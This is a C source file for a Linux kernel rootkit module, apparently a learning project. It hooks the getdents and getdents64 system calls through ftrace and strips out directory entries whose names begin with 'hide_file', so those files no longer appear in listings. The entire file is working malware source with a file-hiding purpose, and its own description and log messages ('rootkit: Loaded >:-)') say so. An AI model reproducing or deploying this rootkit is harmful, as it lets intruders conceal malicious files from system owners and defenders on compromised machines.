#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

#define PREFIX "hide_file"

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

#define ERROR_HANDLE(buffer1, ret) \
	{kfree((buffer1)); return (ret);}	

static asmlinkage long hook_sys_getdents64(const struct pt_regs * regs) {
	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
	//struct linux_dirent64 *current_dir, *dirent_ker, *dirent_tmp = NULL;
	unsigned long offset_ker = 0;

	long error;

	// ret is the total size of total directories.
	int ret = orig_getdents64(regs);

	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	
	// kzalloc = kmalloc + memset
	dirent_ker = kzalloc(ret, GFP_KERNEL);
	if ((ret <= 0) || (dirent_ker == NULL))
		return ret;
	
	error = copy_from_user(dirent_ker, dirent, ret);
	if (error) 
		ERROR_HANDLE(dirent_ker, ret);
	while (offset_ker < ret) {
		current_dir = (void *)dirent_ker + offset_ker;
		// 为什么只有第一个才用memmove而不是所有的都使用memmove？
		// previous_dir += current_dir->d_reclen的后果是造成文件的大小虚高？
		if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
			if (current_dir == dirent_ker) {
			 	ret -= current_dir->d_reclen;
			 	memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
			 	continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
			printk(KERN_INFO "rootkit: Found %s\n", current_dir->d_name);
			//continue;
		}  else {
			//memmove(dirent_tmp + offset_tmp, (void *)current_dir, current_dir->d_reclen);
			//memcpy((void *)dirent_tmp + offset_tmp, (void *)dirent_ker + offset_ker, current_dir->d_reclen);
			previous_dir = current_dir;
			//offset_tmp += current_dir->d_reclen;
		}
		offset_ker += current_dir->d_reclen;
	}
	error = copy_to_user(dirent, dirent_ker, ret);
	if (error) 
		ERROR_HANDLE(dirent_ker, ret)
	kfree(dirent_ker);	
	return ret;
}

static asmlinkage long hook_sys_getdents(const struct pt_regs * regs) {
	struct linux_dirent {
		unsigned long d_ino;
		unsigned long d_off;
		unsigned short d_reclen;
		char d_name[];
	};
	struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;
	// unsigned int count = regs->dx;
	// unsigned int fd = regs->di;
	long error;

	struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
	// struct linux_dirent *current_dir, *dirent_ker, *dirent_tmp = NULL;
	unsigned long offset_ker = 0;

	int ret = orig_getdents(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);

	if ((ret <= 0) || (dirent_ker == NULL))
		return ret;

	error = copy_from_user(dirent_ker, dirent, ret);
	if (error)
		ERROR_HANDLE(dirent_ker, ret);

	while (offset_ker < ret) {
		current_dir = (void *)dirent_ker + offset_ker;
		if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
			if (current_dir == dirent_ker) {
			 	ret -= current_dir->d_reclen;
			 	memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
			 	continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
			printk(KERN_INFO "rootkit: found %s\n", current_dir->d_name);
			//continue;
		} else {
			//memmove(dirent_tmp + offset_tmp, (void *)current_dir, current_dir->d_reclen);
			//memcpy((void *)dirent_tmp + offset_tmp, (void *)dirent_ker + offset_ker, current_dir->d_reclen);
			//offset_tmp += current_dir->d_reclen;
			previous_dir = current_dir;
		}
		offset_ker += current_dir->d_reclen;
	}
	error = copy_to_user(dirent, dirent_ker, ret);
	if (error)
		ERROR_HANDLE(dirent_ker, ret)
	kfree(dirent_ker);
	return ret;
}

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_getdents64", hook_sys_getdents64, &orig_getdents64),
	HOOK("__x64_sys_getdents", hook_sys_getdents, &orig_getdents),
};

static int __init rootkit_init(void) { 
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (err)
		return err;

	printk(KERN_INFO "rootkit: Loaded >:-)\n");
	return 0;
}

static void __exit rootkit_exit(void) {
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("clf");
MODULE_DESCRIPTION("hide files");
MODULE_VERSION("0.01");